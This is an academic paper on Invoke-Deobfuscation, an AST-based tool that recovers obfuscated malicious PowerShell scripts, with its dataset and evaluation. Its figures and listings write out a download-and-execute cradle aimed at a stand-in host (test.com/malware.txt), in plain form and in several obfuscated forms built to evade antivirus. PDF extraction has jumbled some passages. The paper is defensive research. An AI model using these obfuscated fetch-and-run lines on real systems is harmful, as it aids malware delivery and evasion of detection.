@@ -1,0 +1,1144 @@
+                          Invoke-Deobfuscation:
+                   AST-Based and Semantics-Preserving
+                   Deobfuscation for PowerShell Scripts
+                                                                 ∗                                              ∗
+                            Huajun Chai1,2,3 , Lingyun Ying3 , Haixin Duan4,5 and Daren Zha1
+      1
+          Institute of Information Engineering, Chinese Academy of Sciences {chaihuajun, zhadaren}@iie.ac.cn
+                          2
+                            School of Cyber Security, University of Chinese Academy of Sciences
+                            3
+                              QI-ANXIN Technology Research Institute yinglingyun@qianxin.com
+                      4
+                        BNRist & Institute for Network Science and Cyberspace, Tsinghua University
+                          5
+                            Tsinghua University-QI-ANXIN Group JCNS duanhx@tsinghua.edu.cn
+
+
+   Abstract—In recent years, PowerShell has been widely used in          can easily evade the detection of the state-of-the-art anti-virus
+cyber attacks and malicious PowerShell scripts can easily evade          engines in VirusTotal [13]. Moreover, existing deobfuscation
+the detection of anti-virus software through obfuscation. Exist-         tools perform poorly on the recovery of obfuscated scripts. For
+ing deobfuscation tools often fail to recover obfuscated scripts
+correctly due to imprecise obfuscation identification, improper          instance, Windows Antimalware Scan Interface (AMSI) [14],
+recovery and wrong replacement. In this paper, we propose                which is a popular deobfuscation interface integrated by many
+an AST-based and semantics-preserving deobfuscation approach,            anti-viruses, can deal with obfuscation scripts through catching
+Invoke-Deobfuscation. It utilizes recoverable nodes of Abstract          the scripts that are ultimately being supplied to the scripting
+Syntax Tree to identify obfuscated pieces precisely, simulates the       engine. It can still be bypassed easily by simple obfusca-
+recovery process through Invoke function and variable tracing,
+and replaces obfuscated pieces in place to keep the original             tion techniques, like string concatenating. Thus, deobfuscation
+semantics. We build a large evaluation dataset containing 39,713         plays an important role in malicious script detection and
+wild PowerShell scripts. Compared with the state-of-the-art tools,       analysis. As Fig 1 shows, deobfuscation is the reverse process
+the experimental results show Invoke-Deobfuscation performs              of obfuscation, so analysts can get more useful information
+most efficiently. It recovers much more key information than             from deobfuscation results for further analysis.
+others and significantly reduces samples’ obfuscation score, on
+average, by 46%. Moreover, 100% of Invoke-Deobfuscation’s
+results have the same network behavior as the original scripts.                  (New-Object Net.WebClient).downloadstring ("https:/test
+   Index Terms—PowerShell, deobfuscation, abstract syntax tree                   .com/malware.txt")
+
+
+                                                                                       obfuscate                    deobfuscate
+                        I. I NTRODUCTION
+                                                                                 (&("{0}{1}{2}" -f 'New-O','bje','ct’) ("{0}{2}{1}”
+PowerShell is a powerful tool on Windows and widely used                         -f'Net’,'lient','.WebC')).("{1}{2}{0}"-f 'g’,'downlo’,
+in cyber attacks. PowerShell consists of a command-line shell                    'adstrin’).Invoke(("{6}{2}{3}{0}{1}{7}{5}{4}"-f
+                                                                                 'com/m','a','es','t.’,'txt','ware.','https:/t','l'))
+and the associated scripting language. It provides access to
+the inner core of a machine, including unrestricted access to
+Windows APIs [1]. Therefore, more and more cyber criminals                 Fig. 1: An example of obfuscation and deobfuscation.
+have added PowerShell to their attack arsenals [2]–[4]. In
+2020, PowerShell was reported as the most common attack                  Existing Approaches. Deobfuscation is mainly divided into
+technique in the threat detection result of RedCanary [5].               three steps, i.e., identifying obfuscated script pieces, recover-
+   Obfuscated PowerShell scripts can make malicious code                 ing obfuscation, and reconstructing scripts. PSDEM [15], PS-
+detection results unreliable and easily evade the detection of           Decode [16], PowerDrive [17], and PowerDecode [18] design
+                                                                                                脚本: Ie`X
+                                                                         a set of regular expressions         (-jOiN
+                                                                                                        to match       ('echo h',
+                                                                                                                    obfuscated        'ello')
+                                                                                                                                 script pieces. )
+anti-virus software [6], [7]. In recent years, many machine
+                                                                         However, these regularTokens:
+                                                                                                    expression
+                                                                                                            IeX based  ( methods
+                                                                                                                           -jOiN    ignorechotheh , ello
+                                                                                                                                     (
+learning and deep learning based models are proposed to detect
+malicious scripts [8]–[11]. Since obfuscation can modify the             syntax information of scripts so that they often identify wrong  ...
+                                                                                                                           -Join
+text features of scripts completely, these models cannot detect          script pieces with invalid syntax. IeX        (
+                                                                                                               Li et al. [19] use a( machine
+                                                                                                                                          echo h  , ello
+                                                                                                                                          ...
+the obfuscated malicious scripts correctly. There are many               learning based classifier to identify
+                                                                                                          Invoke- obfuscated script pieces.
+                                                                                                                       (   -Join     (    echo h  , ello
+                                                                                                         Expression
+public obfuscation tools, like Invoke-Obfuscation [12]. After            Their classifier uses the features       of Abstract Syntax Tree
+being obfuscated by these tools, malicious PowerShell scripts            (AST) nodes to identify obfuscated pieces with valid      逆序处理
+                                                                                                                                        syntax,
+                                                                         which heavily depends on the quality of the training data.
+  ∗ corresponding authors
+                                                                                                结果: Invoke-Expression (-Join ('echo h', 'ello'
+                                                                            Predefined recovery rule, overriding function and direct
+
+
+
+                                                                     1
+execution are the three common deobfuscation methods. Pre-               more than twice that of other tools, 4) Invoke-Deobfuscation
+defined recovery rule [16]–[18] simulates the recovery process           can keep the deobfuscation results consistent with the original
+according to the type of obfuscation, which is only effective            scripts in semantics, 5) Invoke-Deobfuscation can significantly
+for a few specific obfuscation techniques and often gets wrong           mitigate script obfuscation.
+results because of ignoring the syntax of the obfuscated script          Contributions. This paper makes the following contributions:
+pieces. Overriding function [16]–[18] is used to deal with the              • We propose the first AST-based and semantics-preserving
+obfuscated arguments of the specific functions, like Invoke-                  deobfuscation approach with variable tracing, Invoke-
+Expression. It intercepts the target functions and catches their              Deobfuscation. It can precisely identify and correctly
+run-time arguments that go through several passes of deobfus-                 recover obfuscated script pieces and make sure the de-
+cation, which is limited. Direct execution [18], [19] is another              obfuscated script’s syntax is valid and the semantics is
+method to handle the obfuscated script pieces. Because most                   unchanged.
+obfuscated script pieces contain both obfuscated data and their             • We design and implement Invoke-Deobfuscation in
+corresponding recovery code, by direct executing the recovery                 PowerShell language, which is a well-designed, cross-
+code, the obfuscated data can be deobfuscated. However, due                   platform and easy-to-use tool. It is easy for developers to
+to the lack of context, this method cannot correctly handle the               use and integrate our tool’s modules.
+obfuscated pieces with variables.                                           • Invoke-Deobfuscation outperforms state-of-the-art tools
+   All of the script reconstruction methods of existing deobfus-              in deobfuscation efficiency and effectiveness, semantic
+cation tools are context-free so that their final deobfuscation               consistency, and mitigation of obfuscation. The amount
+scripts may be syntactically invalid or semantically inconsis-                of key information recovered by Invoke-Deobfuscation
+tent. They replace all the same obfuscated pieces in the script               is far beyond that of other tools. All results of Invoke-
+at once, which ignores the different contexts of these pieces                 Deobfuscation perform the same network behavior as
+and may change the script’s semantics.                                        the original samples. Additionally, Invoke-Deobfuscation
+Challenges. In summary, there are three main challenges for                   significantly reduces the obfuscation score of samples by
+deobfuscating PowerShell scripts. 1. Precise Identification:                  46%.
+the first challenge is how to precisely identify obfuscated script          • We introduce a large dataset containing 39,713 wild
+pieces. 2. Correct Recovery: the second challenge is how to                   malicious PowerShell scripts, which covers all known
+correctly recover original script pieces from obfuscated script               obfuscation methods.
+pieces. 3. Valid Reconstruction: the last challenge is how to               To foster future research, we have released the source code
+make sure the final reconstructed scripts are valid in syntax            of Invoke-Deobfuscation and the dataset on Gitee1 .
+and semantically consistent with the original scripts.
+Our Approach. To overcome these challenges, we pro-                                    II. BACKGROUND AND M OTIVATION
+pose a deobfuscation approach based on AST, Invoke-                      A. PowerShell and PowerShell Attack
+Deobfuscation. To obtain the correct deobfuscation results,
+                                                                         PowerShell is a command-line shell and powerful scripting
+Invoke-Deobfuscation 1) identifies obfuscated script pieces
+                                                                         language. It provides unprecedented access to a machine’s
+based on the tokens and recoverable nodes of AST of scripts,
+                                                                         inner core, including unrestricted access to Windows APIs [1].
+2) traces variables to get the context of obfuscated script
+                                                                         PowerShell is a cross-platform (Windows, Linux, and macOS)
+pieces and recover them with the help of Invoke function,
+                                                                         tool [20] and pre-installed on Windows [21]. Therefore, Pow-
+and 3) reconstructs scripts based on the post-order traversal
+                                                                         erShell has become a favorite tool among attackers [4].
+of AST and strictly replaces obfuscated pieces in place to
+                                                                            PowerShell has been widely used in a variety of cyber
+keep the original semantics of scripts as far as possible. To
+                                                                         attacks, such as ransomware, phishing emails, persistent threat,
+evaluate the effectiveness of our approach in real PowerShell
+                                                                         etc. [2], [19]. Attackers can utilize malicious PowerShell
+scripts, we collected 2,025,175 wild malicious samples. After
+                                                                         scripts to install Trojans on the victim’s computer, steal
+preprocessing such as file type verification, syntax validation
+                                                                         confidential information and obtain admin control, etc. [22],
+and deduplication based on file content and file structure, we
+                                                                         [23]. PowerShell attacks can not only download malicious
+finally get a large dataset including 39,713 PowerShell scripts.
+                                                                         executable files from remote websites but also load them
+We evaluate Invoke-Deobfuscation from four aspects, i.e., the
+                                                                         directly through system memory to bypass the traditional file-
+ability to deal with different obfuscation techniques, deobfus-
+                                                                         based defense methods [1], [23].
+cation effectiveness and efficiency, semantic consistency and
+obfuscation mitigation. We compare Invoke-Deobfuscation                  B. Obfuscation Techniques for PowerShell
+with four other deobfuscation tools, namely, PSDecode, Pow-              PowerShell scripts can be easily obfuscated in various and
+erDrive, PowerDecode and Li et al. The experimental results              flexible ways to evade the detection of anti-virus software.
+demonstrate Invoke-Deobfuscation performs best: 1) Invoke-               Obfuscated scripts are difficult to understand and analyze
+Deobfuscation is robust enough to deal with almost all known             by both human and anti-virus software. According to the
+obfuscation techniques, 2) Invoke-Deobfuscation performs ef-             complexity of obfuscation methods, we divide them into three
+ficiently and stably, 3) the amount of key information, such
+as IP, URL and so on, recovered by Invoke-Deobfuscation is                 1 https://gitee.com/snowroll/invoke-deobfuscation.
+
+
+
+
+                                                                     2
+levels: L1, L2 and L3. We use different levels of obfuscation           C. Effectiveness of Obfuscation on Malicious Detection
+to process the code in Listing 1 and the results are shown in           Obfuscated PowerShell scripts can hide the original intent of
+Listing 2, Listing 3 and Listing 4, respectively.                       the original scripts and easily evade the detection of anti-virus
+L1: This level of obfuscation techniques only have textual              software. Current malicious scripts detection models mainly
+and visual effects and affect readability. These obfuscation            depend on the character-level features or the AST features
+techniques include random whitespace insertion (whitespac-              of the scripts [8]–[11], [25]–[27], which can be completely
+ing), alias, random case and meaningless backtick insertion             changed by obfuscation so that these models cannot identify
+(ticking). The backtick character is referred to as the escape          malicious scripts correctly. Moreover, as shown in section
+character [24]. The code shown in Listing 2 is an example               II-B, the higher the level of obfuscation, the more difficult
+with L1 obfuscation. Its intent is easy to understand because           it is for us to understand the original intent of the scripts.
+most of the information is retained.                                    Analysts need to use dynamic analysis to infer the intent of
+L2: This level of obfuscation techniques will modify the                these obfuscated scripts, which is inefficient and has low code
+lexical features and the AST hierarchies of the original scripts,       coverage. With the help of a cyber security company, QI-
+but they still retain some character-level information of the           ANXIN, we have collected 1,127,349 malicious PowerShell
+original scripts. String-related obfuscation techniques are com-        samples from January 1 to May 29, 2021, and find that about
+monly used, such as string concatenating, reordering, replacing         98.78% samples are obfuscated. The proportion of different
+and reversing. Listing 3 shows the code with L2 obfuscation.            levels of obfuscation is shown in Table I. Note that one
+Though it is difficult to understand, we can still infer the            sample may contain many obfuscation techniques with one,
+general intent of the code from the character-level information.        two or three levels, so the total proportion in Table I is larger
+L3: This level of obfuscation techniques not only change the            than 100%. Therefore, deobfuscation is very important for
+lexical features and the AST hierarchies of the original scripts        malicious scripts detection and analysis.
+but also hide the character-level information of the original
+scripts. The typical obfuscation techniques of this level are            TABLE I: Proportion of obfuscation at different levels.
+various encoding methods, e.g., Base64, ASCII, etc. Listing 4
+shows the code with L3 obfuscation, we cannot directly infer                        Obfuscation Level   #Samples    Proportion
+the malicious URL from the script’s textual information.                                   L1           1,105,581    98.07%
+                                                                                           L2           1,103,023    97.84%
+(New-Object Net.WebClient).downloadstring('ht c 1                                          L3           1,083,191    96.08%
+ ,→ tps://test.com/malware.txt')
+
+    Listing 1: A simple example without obfuscation.                                         III. M ETHODOLOGY
+                                                                        To overcome the challenges mentioned above, we propose
+                                                                        an AST-based deobfuscation approach with variable trac-
+(nE`w-oBjE`Ct    nET.wE`bcLiEnT).DoWNlOaDsTrIn c 1                      ing, Invoke-Deobfuscation. Fig 2 shows the framework of
+ ,→ g('https://test.com/malware.txt')
+                                                                        Invoke-Deobfuscation. The deobfuscation process of Invoke-
+                                                                        Deobfuscation can be divided into three phases: token parsing,
+         Listing 2: An example of L1 obfuscation.
+                                                                        variable tracing and recovery based on AST, renaming and
+                                                                        reformatting.
+                                                                           We describe each phase in detail as follows.
+Invoke-Expression ((("{13}{0}{8}{6}{12}{16}{7 c 1
+ ,→ }{14}{10}{1}{9}{5}{15}{3}{2}{11}{4}"                                A. Token Parsing
+ ,→ -f'e','Uht','om/malwar','t.c','.txtjYU)', c
+ ,→ '://','et','nloadst','ct                                            Token parsing uses the lexical information of scripts
+ ,→ N','tps','(jY','e','.WebCl','(New-Obj','r c                         to recover obfuscation. Most obfuscation techniques at
+ ,→ ing','tes','ient).dow')).RepLACe('jYU',[S c                         the L1 level are related to tokens, so we can re-
+ ,→ TRiNg][CHar]39))                                                    cover them through token parsing. We tokenize the scripts
+                                                                        of PowerShell based on Microsoft’s official library, Sys-
+         Listing 3: An example of L2 obfuscation.                       tem.Management.Automation.PSParser [28]. Each token con-
+                                                                        tains many attributes, such as content, start, length, etc. We
+                                                                        utilize the attributes of tokens to recover original tokens and
+( '99S5i46}60~@......d60-42~57-46@101@63d51i6 c 1                       combine them to form a deobfuscation script. Fig 3 shows a
+ ,→ 3}108}98'-SPLIT'~' -SPLit
+ ,→ 'd'-SPliT'}'-sPLiT 'i'-SpliT ',' -SPLit                             simplified process of token parsing.
+ ,→ 'J'| fOrEAch-ObJECt{ [cHAR]($_                                         Each token corresponds to a complete lexical unit in the
+ ,→ -BxoR'0x4B' ) })-jOiN'' |& (                                        script, whose attributes can help us to identify and recover
+ ,→ $Env:coMSpEC[4,24,25]-JOiN'')                                       obfuscation on the token.
+                                                                           For instance, if a token’s type is command and its content
+         Listing 4: An example of L3 obfuscation.                       is an alias, like IeX in Fig 3, we will replace it with its
+
+
+
+                                                                    3
+                                                                                                                Token                                                  Recovery based on AST
+                                                    ...       IeX           (      nEw-oBJecT       ...        Parsing                             ScriptBlock
+                                                                                                                                                                                                Rename & Reformat
+                                                                                   process                                                                               Recoverable nodes
+                   $xfdsf = '{1}{0}{2}' -f 'p                                                                                                      NamedBlock
+                   s://test.com/m', 'htt',
+                                              ... Invoke-Expression   (    New-Object ...
+                    'alware.txt';Ie`X (nE`w
+                   -oBJecT net.`WEBcLIe                                                                                                       AssignmentStatement            Pipeline
+             $a  = nT).DOwnLoAdsTrInG(
+                     '(New-Object Net.W'
+             $b  = $xfdsf)
+                     'ebClient).downloa'                                                                                                                                         ...
+             $c  = 'dstring("https:/t' Recovery:        '{1}{0}{2}' -f 'ps://test.com/m',
+                                                                                                                                                                                               $var0 = 'https://test.com/m
+                                                                             'htt', 'alware.txt'                                                                        VariableExpression
+             $d = 'est.com/malware.txt")'                                                                                              VariableExpression                                      alware.txt';
+                                                                                                      invoke                                                                                   Invoke-Expression (New-O
+             -join ($a, $b, $c, $d) | iex                                                                                                                                                      bject net.webclient).down
+                                                                                                                                        variable         CommandExpression         variable
+                                                                                https://test.com/malware.txt                                                                       tracing     loadstring('https://test.com
+                                                                                                                                        tracing
+                                                                                                                                                                                               /malware.txt')
+                                                                                                                                                          BinaryExpression
+                                                                  yes
+                                                                                      Invoke-Expression /                                                        ...
+                                                                                                 Node
+                                                                                          PowerShell
+                                                                      AST                         Type
+                        Remove Ticks                      7                                         no
+                                                                                                                             Replace
+
+                                                3                 6               recoverable    Assignment
+                                                                           'https://test.com/malware.txt'
+Obfuscated              Replace Alias
+  Script
+                                            1        2        4        5                                             Record
+                          Replace                                                    Iex              Invoke
+                                                                                                                     Variable
+                        RandomCase
+                                                              Fig. 2: An overview         of Invoke-Deobfuscation operation scheme.
+                                                                            Reconstruct Script
+                       Token Parsing
+
+
+             Script: Ie`X (-jOiN ('echo h', 'ello') )                                                                                    berExpressionAst and SubExpressionAst. We extract the
+             Tokens:        IeX         (       -jOiN             (             echo h        ,       ello      )        )               content of recoverable nodes as recoverable pieces. Based
+                                                                       ...
+                                                                                                                                         on the recoverable nodes, we can identify not only known
+                            IeX         (       -Join             (             echo h        ,       ello      )        )
+                                                                       ...                                                               obfuscation techniques but also related unknown ones.
+                         Invoke-
+                        Expression
+                                        (       -Join             (             echo h        ,       ello       )       )                  2) Recovery Based on Invoke: We execute the recoverable
+                                                                                                                                         script pieces through the Invoke function to get their recovery
+                                                 Process In Reverse Order
+                                                                                                                                         result. Firstly, we convert the recoverable script piece into
+             Result: Invoke-Expression (-Join ('echo h', 'ello') )
+                                                                                                                                         a script block. Then we use its member function Invoke to
+                         Fig. 3: An example of token parsing.                                                                            execute itself.
+                                                                                                                                            For different types of execution results, we convert them into
+                                                                                                                                         their corresponding string forms as recovery results to preserve
+     full name, Invoke-Expression. Based on these attributes,                                                                            their semantics. For instance, suppose that the execution
+     we can deal with other obfuscation at the token level, such                                                                         result’s content is 123 and its type is String, the recovery
+     as random case and ticking (the meaningless backtick will                                                                           result is '123'. If its type is Number, the recovery result
+     be removed when tokenized). After handling one obfuscated                                                                           is 123. When the execution result’s type cannot represent in
+     token, we will replace it with its recovery result in the script.                                                                   string form, like Object, we keep the recoverable script pieces.
+     The reverse order allows us to identify the unprocessed tokens                                                                         The recoverable script pieces may contain commands unre-
+     without parsing the new script. Eventually, we can get the                                                                          lated to the recovery process, such as Restart-Computer, Start-
+     script without obfuscation at the token level.                                                                                      Sleep, etc. Thus, we create a blocklist of these commands to
+     B. Recovery Based on AST                                                                                                            speed up deobfuscation. If recoverable pieces contain these
+     No matter how complex the obfuscated script pieces are, they                                                                        irrelevant commands, we do not execute them. For security,
+     are obtained from the original script pieces after a series of                                                                      our tool should be run within an isolated sandbox.
+     transformations. Obfuscated script pieces generally include                                                                            3) Variable Tracing: Due to the lack of context, we cannot
+     obfuscated data and its recovery algorithm, which we call                                                                           directly execute the recoverable pieces containing variables to
+     recoverable script pieces. The key to deobfuscation is to                                                                           get correct recovery results. To overcome this challenge, we
+     identify these recoverable pieces in an obfuscated script.                                                                          use a symbol table to record the scope and value of variables
+        1) Identifying Recoverable Pieces: We use the content                                                                            appeared in the script. The pseudo code 1 shows the process
+     of specific types of nodes on PowerShell AST to identify                                                                            of our variable tracing.
+     recoverable script pieces. Firstly, the content of each node of                                                                        We record the scope of each variable appeared in the script
+     PowerShell scripts’ AST is valid in syntax, which contains the                                                                      through the structure of AST. According to their accessibility,
+     recoverable script pieces. Secondly, we can obtain the original                                                                     there are three types of variables: local variables, global vari-
+     pieces through executing the recoverable pieces. For example,                                                                       ables and environment variables. As their names indicate, we
+     'he'+'llo' can be executed to get 'hello'. Therefore,                                                                               only need to record the scope of local variables. We traverse
+     we analyze all types of nodes in PowerShell AST and find the                                                                        the AST in post-order and record the scope of the currently
+     types of nodes whose content often can get results in string                                                                        visited node. Only when visiting the six types of nodes,
+     form after execution. We call these types of nodes recoverable                                                                      namely, NamedblockAst, IfStatementAst, WhileStatemen-
+     nodes, which include PipelineAst, UnaryExpressionAst, Bi-                                                                           tAst, ForStatementAst, ForEachStatementAst and State-
+     naryExpressionAst, ConvertExpressionAst, InvokeMem-                                                                                 mentBlockAst, the scope depth of the current node will
+
+
+
+                                                                                                                                   4
+increase or decrease. The change depends on the traversal               obfuscate the script string with various methods directly. To
+direction, from parent to child or vice versa.                          keep the original semantic, they only need to add Invoke-
+   We record the value of variables in a symbol table through           Expression or PowerShell to invoke the obfuscated string.
+executing their assignment expression. Based on Assign-                    The key to dealing with multi-layer obfuscation is to
+mentStatement nodes, we can identify variables and their                identify the command Invoke-Expression and PowerShell.
+assignment expression. When the assignment expression con-              However, attackers often use different methods to obfus-
+tains unknown variables which are not contained in the symbol           cate these commands. For example, the obfuscated piece
+table, we do not execute the expression and abandon recording           .($pshome[4]+$pshome[30]+'x') is equivalent to
+the assigned variable. Besides, for environment variables, we           Invoke-Expression. We can get the recovery result .('iex')
+can use the command Get-Variable to obtain their correct                with variable tracing, which is one of common format of
+value.                                                                  Invoke-Expression. Iex is the alias of Invoke-Expression and
+                                                                        . can call a string as a command. The other common
+  Algorithm 1: Variable Tracing                                         formats of Invoke-Expression include iex, 'xxx' |iex,
+   input : AST for the script T                                         and &'iex'. We can identify different formats of Invoke-
+ 1 Post-order traverse the T and put nodes into a queue                 Expression through variable tracing and recovery based on
+    Q;                                                                  AST. PowerShell can execute Base64-encoded commands
+ 2 Let Nr be the root of T ;                                            using the parameter -EncodedCommand. Due to the auto-
+ 3 Sv record variables’ value; Sc record variables’ scope;              completion and case insensitive of PowerShell, this parameter
+ 4 Sv = ∅; Sc = ∅;                                                      can be used in kinds of formats, such as -e, -eNc and
+ 5 while Q is not empty do                                              so on. We convert the parameter into lower case and use
+ 6     nc := Q[0];                                                      '-encodedcommand'.StartsWith($param) to deter-
+ 7     Let np be the parent of nc ;                                     mine whether the parameter is -EncodedCommand.
+ 8     if nc .type is VariableExpressionAst then                           To deal with multi-layer obfuscation, we convert the string
+ 9         if nc in a loop or nc in a conditional statement             parameter of Invoke-Expression and PowerShell and deobfus-
+             then                                                       cate it. We repeat this process until the recovery result of
+10             Remove nc from Sv and Sc ;                               the script no longer changes. In this way, we can get the
+11             Continue;                                                original script pieces from the script pieces with multi-layer
+12         end                                                          obfuscation.
+13         if np .type is AssignmentStatementAst then                      5) Script Reconstruction: We reconstruct the deobfusca-
+14             Let expr be the assignment expression;                   tion script based on the post-order traversal of AST. When
+15             if expr contains unknown variables then                  visiting a node, we use its child nodes’ content to update its
+16                  Remove nc from Sv and Sc ;                          content first. The post-order traversal ensures that its all child
+17                  Continue;                                           nodes have been processed when visiting it. If its content
+18             end                                                      is obfuscated, we will replace it with its recovery result.
+19             Sv [nc ] = expr.value;                                   Eventually, we will get the whole deobfuscation script when
+20             Sc [nc ] = current scope;                                we visit the root of the AST. We replace the obfuscated script
+21         else                                                         pieces in place so that the deobfuscation script is consistent
+22             if Sv [nc ] 6= null and (Sv [nc ] is string or           with the obfuscated script semantics.
+                 number) and nc .scope in Sc [nc ] then
+23                  replace nc with Sv [nc .name]                                               unvisited node
+
+                                                                                                current node
+24             end                                                                              visited node
+25         end                                                                                  node’s record         'a'+'b' +'c'
+26     end
+27     Remove nc from Q                                                                                               'a'+'b' +'c'
+
+28 end
+                                                                                                                      'a'+'b' +'c'                 'ab' +'c'
+
+
+                                                                                            'ab'                 'a'+'b'                     'c'               'c'
+   With variable tracing, we can correctly obtain the recovery
+results of the recoverable script pieces which contain variables.                         'a'            'a'               'b'         'b'
+Our current implementation of variable tracing still has some
+limitations, we will discuss them in detail in Section V-C.                    Fig. 4: The process of reconstructing script.
+   4) Invoke-Expression and PowerShell: Complex obfus-                                                         100
+cated scripts often contains multi-layer obfuscation, whose                Assuming that one 90script’s OriginData
+                                                                                                         content is 'a'+'b' +'c',
+                                                                                                        PSDecode
+typical feature is to include Invoke-Expression cmdlet or               its AST and the reconstruction
+                                                                                                 80         process is shown in Fig 4.
+                                                                                                        PowerDrive
+PowerShell. Invoke-Expression and PowerShell both can run               When we visit the recoverable
+                                                                                                 70     node of 'a'+'b' +'c', we
+                                                                                                        PowerDecode
+their string parameters as scripts. It means that attackers can         update its content with its
+                                                                                                 60
+                                                                                                    child   nodes’ recovery results and
+                                                                                                                                 Li et al.
+                                                                                                                 50
+                                                                                                                                 Invoke-Deobfuscation
+                                                                                                                 40
+                                                                                                                                 Manual
+                                                                    5                                            30
+
+                                                                                                                 20
+
+                                                                                                                 10
+get a new script piece 'ab' +'c'. Then we deal with the                Based on Microsoft’s official library, we can correctly parse
+piece 'ab' +'c' and update the record of the current node’s            the tokens and AST of PowerShell scripts.
+content with the recovery result. When we visit the root of the          We check the syntax of the result after each step of the
+AST, we will get the final deobfuscation script.                       deobfuscation process to avoid unexpected syntax errors. We
+                                                                       skip the current deobfuscation step to keep the script with valid
+C. Rename and Reformat                                                 syntax if the current result contains syntax errors.
+Renaming randomly named variables and functions and refor-             B. Evaluation Approaches
+matting code can make the script easier for analysts to analyze.
+Attackers often randomize the name of variables and functions             1) Data Collection: In previous works, the obfuscated
+in a script to make it hard to understand.                             samples in their datasets are simple or manually generated,
+   We use statistical analysis to determine whether the variable       which only covers a few types of obfuscation methods [19],
+name function name is random and replace the randomized                [30]. That is obviously different from wild PowerShell scripts
+name with predefined rules. For us, it is difficult to determine       which contain complex and diverse obfuscation techniques.
+whether a word is random in isolation. Therefore, we extract              To better evaluate the effect of Invoke-Deobfuscation, we
+all unique variable and function names in the script and regard        collected 2,025,175 wild malicious samples from January 1
+them as a whole string. We determine whether the string                to May 29, 2021, with the help of a cyber security company,
+is random based on the proportion of vowels and special                QI-ANXIN. According to the source, these samples can be
+characters. Hayden [29] points out the proportion of vowels is         divided into two categories. 1) Category-One is the samples
+about 37.4% in General American English, so we assume that             that are labeled as PowerShell by anti-virus software. The
+the string is random when the proportion of vowels in English          number of these samples is 1,318,151, but there are a lot of
+characters is not between 32% and 42%. For special characters          duplicates, i.e., the content and structure of some samples are
+that are not English letters, we statistically compared 4,234          highly similar but their hash values are different. 2) Category-
+normal PowerShell scripts from GitHub with the malicious               Two is the samples whose file type is identified as PowerShell
+scripts we collected, and find that the proportion of English          by TrID [31] or file [32]. There are 707,024 samples of this
+letters in the normal scripts is greater than 70% and the pro-         category. Rule-based file type identification is inaccurate so
+portion of English letters in the names with special characters        that many other types of files are included.
+is less than 2%. Thus, we assume that a string is random               Preprocessing. We utilize the syntax information and textual
+when its proportion of English letters is less than 10%. We            features of samples to remove invalid and duplicate Power-
+use var{num} and func{num} to substitute the randomized                Shell samples. Firstly, we remove the samples with invalid
+variable and function names. The new name depends on the               syntax which cannot be converted to a PowerShell script block.
+order in which the obfuscated script piece appears.                    Secondly, we utilize token information to remove the non-
+   Eventually, we reformat the code by removing the random             PowerShell samples. If the samples cannot get any token after
+whitespace characters and indenting it with a standardized             tokenizing, we remove them. These samples often belong to
+format. As shown in Fig 7(d), the randomized variable names            other file types, such as Mail and HTML. Meanwhile, when
+are replaced and random whitespace characters are deleted.             all commands of the samples are unknown or the command
+Furthermore, this module is extensible.                                tokens contain invalid characters like = and %, we remove
+                                                                       their corresponding samples. Thirdly, we remove meaningless
+         IV. I MPLEMENTATION AND E VALUATION                           samples for our research, which only contain one string token.
+                                                                       Then we get 1,127,349 PowerShell scripts.
+In this section, we introduce the implementation of                       We observe that the structures of many malicious scripts
+Invoke-Deobfuscation firstly. Then, we compare Invoke-                 in the same family are highly similar. The differences among
+Deobfuscation with the previous deobfuscation tools, such              them mainly are strings, such as different malicious URLs.
+as PowerDrive [17], PSDecode [16], PowerDecode [18] and                To remove the samples with the same structure, we replace
+Li et al. [19] from four aspects: 1) the ability to deal with          all string tokens with the same placeholder string and then
+common obfuscation methods, 2) deobfuscation effectiveness             remove the duplicate samples.
+and efficiency, 3) behavioral consistency, and 4) obfuscation          DataSet. After preprocessing, we ultimately get 39,713 Pow-
+mitigation. All experiments are conducted on a virtual machine         erShell samples. The previous datasets only contains few
+with an Intel Xeon E5-2630 v4 Processor 2.2 GHz and 6 GB               types obfuscation techniques [30] and even come from manual
+memory, running Windows 10 Pro (64-bit).                               generation [19]. Compared with the previous datasets, the
+                                                                       obfuscation techniques, malicious functionalities and content
+A. Implementation                                                      structures of scripts in our dataset are more diverse. The file
+We implement Invoke-Deobfuscation with around 2,500 lines              size of these scripts is from 8 bytes to 26 MB and the total
+of PowerShell code, and it can run on multiple platforms               size of the dataset is 7.75 GB.
+(Windows, Linux, macOS). Invoke-Deobfuscation is easy to                  2) Quantification of Obfuscation: We quantify the obfus-
+use with the command Import-Module. It mainly consists of 3            cation of a sample by scoring the known obfuscation in the
+modules and each of the modules can be independently used.             sample. In Section II-B, we divide the different obfuscation
+
+
+
+                                                                   6
+                              TABLE II: Comparison of deobfuscation ability of different tools.
+
+                 Level        Type             Subtype         PowerDrive     PSDecode    PowerDecode    Li et al.   Our tool
+                                               Ticking              X            X             ×            X          X
+                         Randomization      Whitespacing            ×            ×             ×            ×          X
+                   1                        Random Case             ×            ×             ×            ×          X
+                                            Random Name             ×            ×             ×            ×          X
+                              Alias                -                ×            ×             ×            ×          X
+                                             Concatenate            X            ×             X                       X
+                                               Reorder              ×            ×             ×                       X
+                   2      String-related
+                                               Replace              ×            ×             X            ×          X
+                                               Reverse              ×            ×             ×            ×          X
+                                             Binary/Octal
+                                                                    ×            ×             ×            ×           X
+                                             ASCII/Hex
+                            Encoding            Base64              ×            ×             ×                        X
+                   3                         Whitespace             ×            ×             ×            ×           ×
+                                             Specialchar            ×            ×             ×            ×           X
+                                                 Bxor               ×            ×             ×            ×           X
+                          SecureString             -                ×            ×             ×            ×           X
+                            Compress        DeflateStream           ×            ×             ×            ×           X
+                    Can only successfully handle partial obfuscation.
+
+
+
+techniques into three levels, namely, L1, L2 and L3. For all                obfuscated script pieces through tokens and recoverable nodes
+obfuscation techniques that appear in a script, we score them               of AST, which is robust enough to identify obfuscation in
+according to their level of obfuscation. For example, if an                 different positions. With variable tracing and executing the
+obfuscation technique is at the L1 level, its score is one. We              obfuscated pieces, we can correctly recover the script pieces.
+only score once for each type of obfuscation that appears in the            Moreover, our tool is capable of handling complex multi-layer
+script. Finally, we sum these scores to get the final obfuscation           obfuscation. Due to the limitation of our variable tracing, we
+score of the script. Based on regular expression matching,                  cannot deal with the whitespace encoding obfuscation which
+tokens and AST of PowerShell scripts, we can identify all                   often has a loop statement. However, whitespace encoding
+known obfuscation techniques shown in Table II.                             obfuscation only accounts for 0.1% in the dataset.
+C. Evaluation Results                                                          In comparison, PSDecode, PowerDrive and PowerDecode
+   1) Deobfuscation Ability: Deobfuscation ability is deter-                can only deal with a few obfuscation techniques. Because
+mined by precisely identifying obfuscation and correctly deal-              they use regular expression to match specific obfuscation
